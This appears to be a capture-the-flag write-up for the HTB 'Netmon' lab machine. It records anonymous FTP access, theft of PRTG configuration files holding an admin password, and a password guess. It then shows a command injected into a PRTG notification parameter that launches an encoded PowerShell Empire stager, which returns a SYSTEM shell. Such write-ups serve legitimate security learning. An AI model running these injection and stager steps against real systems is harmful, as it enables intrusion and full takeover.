---
title: "Netmon"
description: "Notes from the Netmon machine on HTB."

date: 2020-03-06T13:18:23+01:00
draft: false
weight: 800
---

### Where you at

10.10.10.152

### What you got

PRTG Network Monitor 18.1.37.13946

```bash
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

```bash
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Netmon# pftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
227 Entering Passive Mode (10,10,10,152,210,167).
150 Opening ASCII mode data connection.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
227 Entering Passive Mode (10,10,10,152,210,168).
150 Opening ASCII mode data connection.
02-25-19  10:44PM       <DIR>          Administrator
02-02-19  11:35PM       <DIR>          Public
226 Transfer complete.
ftp> cd Administrator
550 Access is denied.
ftp> cd Public
250 CWD command successful.
ftp> ls
227 Entering Passive Mode (10,10,10,152,210,170).
150 Opening ASCII mode data connection.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
02-02-19  11:35PM                   33 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
227 Entering Passive Mode (10,10,10,152,210,173).
150 Opening ASCII mode data connection.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.02 secs (1.8494 kB/s)
```

PRTG data folder

`https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data`

`%programdata%\Paessler\PRTG Network Monitor`

```bash
150 Opening ASCII mode data connection.
02-02-19  11:40PM       <DIR>          Configuration Auto-Backups
01-25-20  05:33AM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
01-25-20  05:33AM       <DIR>          Logs (Web Server)
01-25-20  05:38AM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
01-25-20  11:07AM              1205235 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
01-25-20  11:07AM              1717015 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database

ftp> get PRTG Configuration.dat
local: Configuration.dat remote: PRTG
227 Entering Passive Mode (10,10,10,152,213,160).
550 The system cannot find the file specified.
ftp> get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
227 Entering Passive Mode (10,10,10,152,213,161).
150 Opening ASCII mode data connection.
226 Transfer complete.
1189697 bytes received in 0.28 secs (4.0834 MB/s)
ftp> get "PRTG Configuration.old"
local: PRTG Configuration.old remote: PRTG Configuration.old
227 Entering Passive Mode (10,10,10,152,213,162).
150 Opening ASCII mode data connection.
226 Transfer complete.
1205235 bytes received in 0.28 secs (4.0449 MB/s)
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
227 Entering Passive Mode (10,10,10,152,213,163).
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 0.28 secs (3.8816 MB/s)
ftp> cd "Configuration Auto-Backups"
250 CWD command successful.
ftp> ls
227 Entering Passive Mode (10,10,10,152,213,173).
150 Opening ASCII mode data connection.
02-02-19  11:40PM                59461 PRTG Configuration (Update to 18.1.37.13946).zip
226 Transfer complete.
ftp> get "PRTG Configuration (Update to 18.1.37.13946).zip"
local: PRTG Configuration (Update to 18.1.37.13946).zip remote: PRTG Configuration (Update to 18.1.37.13946).zip
```

```xml
.dat
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>

.old
 </lastlogin>
                <login>
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    H3CVKBQ3ZLXUFZ3NAPPUJWNW62R3VOYAY77KKCTQSU======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    TTVJE4XYVKU2C3NBALRRPCIO4KHETERB
                  </cell>
```

.old.bak

```xml
<!-- User: prtgadmin -->
PrTg@dmin2018
```

prtgadmin:PrTg@dmin2018
prtgadmin:PrTg@dmin2019 -> successful

### reverse shell

`https://thehackingtutorials.com/prtg-network-monitor-exploit-with-poc/`

create notification

`example.ps1`

```powershell
param: test.txt;powershell -noP -sta -w 1 -enc  SQBGA....BFAFgA
(Empire: listeners) > [*] Sending POWERSHELL stager (stage 1) to 10.10.10.152
[*] New agent G9MS1YKR checked in
[+] Initial agent G9MS1YKR from 10.10.10.152 now active (Slack)
[*] Sending agent (stage 2) to G9MS1YKR at 10.10.10.152
(Empire: G9MS1YKR) > whoami
[*] Agent G9MS1YKR returned results.
nt authority\system
```
